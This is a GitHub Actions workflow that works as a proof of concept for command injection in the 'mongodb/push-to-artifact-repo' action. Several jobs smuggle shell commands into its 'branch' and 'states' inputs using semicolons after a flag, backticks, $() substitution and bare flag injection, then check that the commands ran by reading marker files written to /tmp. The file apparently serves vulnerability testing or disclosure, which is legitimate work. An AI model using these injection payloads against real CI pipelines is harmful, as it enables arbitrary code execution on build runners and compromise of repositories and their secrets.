name: POC - Command Injection via Argument Injection

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  # Test: Flag + semicolon pattern (like atlas PoC)
  exploit-flag-semicolon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "POC: --help; command pattern via branch"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          # Pattern from atlas PoC: flag followed by semicolon and command
          branch: "--help; echo 'üö® INJECTION via branch üö®' > /tmp/branch-injection.txt && whoami >> /tmp/branch-injection.txt && pwd >> /tmp/branch-injection.txt || true"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify branch injection
        run: |
          echo "============================================"
          echo "Checking for branch injection..."
          echo "============================================"
          if [ -f /tmp/branch-injection.txt ]; then
            echo "‚úÖ COMMAND INJECTION CONFIRMED via branch!"
            echo "Contents:"
            cat /tmp/branch-injection.txt
          else
            echo "‚ùå File not created - checking if injection reached shell"
          fi

  # Test: Flag + semicolon pattern via states
  exploit-states-semicolon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "POC: --help; command pattern via states"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          states: "--help; echo 'üö® INJECTION via states üö®' > /tmp/states-injection.txt && whoami >> /tmp/states-injection.txt || true"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify states injection
        run: |
          echo "============================================"
          echo "Checking for states injection..."
          echo "============================================"
          if [ -f /tmp/states-injection.txt ]; then
            echo "‚úÖ COMMAND INJECTION CONFIRMED via states!"
            echo "Contents:"
            cat /tmp/states-injection.txt
          else
            echo "‚ùå File not created"
          fi

  # Test: Using backticks for command substitution
  exploit-backticks:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "POC: Backtick command substitution"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          branch: "main`echo INJECTED > /tmp/backtick-injection.txt`"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify backtick injection
        run: |
          if [ -f /tmp/backtick-injection.txt ]; then
            echo "‚úÖ BACKTICK INJECTION CONFIRMED!"
            cat /tmp/backtick-injection.txt
          else
            echo "‚ùå Backtick injection did not work"
          fi

  # Test: $() command substitution
  exploit-dollar-paren:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "POC: Dollar-paren command substitution"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          branch: "main$(echo INJECTED > /tmp/dollarparen-injection.txt)"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Verify dollar-paren injection
        run: |
          if [ -f /tmp/dollarparen-injection.txt ]; then
            echo "‚úÖ DOLLAR-PAREN INJECTION CONFIRMED!"
            cat /tmp/dollarparen-injection.txt
          else
            echo "‚ùå Dollar-paren injection did not work"
          fi

  # Confirmed working: Simple flag injection
  confirmed-flag-injection:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: "‚úÖ CONFIRMED: --version flag injection"
        uses: mongodb/push-to-artifact-repo@main
        continue-on-error: true
        with:
          email: "poc-test@example.com"
          name: "POC Tester"
          branch: "--version"
          source: "./source"
          toRepo: "https://github.com/nonexistent/repo.git"

      - name: Analysis
        run: |
          echo "============================================"
          echo "Flag injection (--version) confirmed working"
          echo "Check logs above for '1.6.0' output"
          echo "============================================"
